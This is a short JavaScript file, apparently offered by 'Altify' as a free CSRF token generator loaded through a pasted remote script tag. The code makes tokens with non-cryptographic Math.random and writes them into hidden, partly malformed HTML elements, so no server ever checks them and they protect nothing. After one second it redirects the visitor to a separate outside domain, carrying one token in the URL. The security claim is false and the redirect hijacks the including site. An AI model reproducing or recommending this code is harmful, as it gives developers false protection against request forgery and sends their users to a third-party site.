/*
// Paste This into your html to use the csrf token generator at no charge whatsoever 
// Created by Altify
<script src="https://altify-chs.netlify.app/html/csrf.js" defer></script>
<p hidden id="csrfid"></p>
<p hidden id="csrfid2"></p>
<p hidden id='csrfid4'></p>
*/

$(document).ready(function() {
  if (window.location.href.indexOf("csrf=true") > -1) {
      setTimeout(randomString, 200);
      function randomString(length, chars) {
      refcount = Math.floor(Math.random() * 100000) + 1;
      var result = '';
      for (var i = length; i > 0; --i) result += chars[Math.floor(Math.random() * chars.length)];
      return result;
      }
      csrf = randomString(32, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ');
      csrf2 = randomString(32, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ');
      csrf3 = randomString(32, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ');
      csrf4 = randomString(32, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ');
      document.getElementById("csrfid").innerHTML = (csrf);
      document.getElementById("csrfid2").innerHTML = (csrf2);
      document.getElementById("csrfid4").innerHTML = ("<label for=csrfid'>cross-site request forgery token:</label><input type='text' id='csrfid' name='csrfid' value="+csrf3+"><br>"); 
      setTimeout(refrsh, 1000);
      function refrsh() {
        window.location.replace("https://altify-developing-001.netlify.app/?xcrsf%20token="+csrf4);
      }
  }
});
